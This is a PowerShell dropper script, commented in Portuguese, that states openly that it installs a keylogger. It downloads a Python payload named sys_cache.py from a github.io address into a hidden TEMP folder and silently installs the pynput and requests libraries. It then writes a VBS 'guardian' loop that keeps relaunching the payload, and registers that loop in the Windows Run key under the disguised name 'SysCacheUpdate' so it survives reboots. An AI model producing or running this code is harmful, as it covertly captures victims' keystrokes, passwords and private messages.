$dir = "$env:TEMP\sys_cache"
if (!(Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force }

# Baixa o keylogger
Invoke-WebRequest -Uri "https://syslog992.github.io/sys-cache-update/sys_cache.py" -OutFile "$dir\sys_cache.py"

# Instala dependências silenciosamente
python -m pip install pynput requests --quiet

# Cria o Guardião VBS para persistência invisível
$vbs = @"
Set WshShell = CreateObject("WScript.Shell")
Do
    WScript.Sleep 10000
    Set objShell = WshShell.Exec("pythonw.exe $dir\sys_cache.py")
Loop
"@
$vbs | Out-File -FilePath "$dir\guardiao.vbs" -Encoding ASCII

# Adiciona ao Registro para iniciar com o Windows
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $regPath -Name "SysCacheUpdate" -Value "wscript.exe $dir\guardiao.vbs"

# Inicia o Guardião imediatamente
Start-Process "wscript.exe" "$dir\guardiao.vbs"
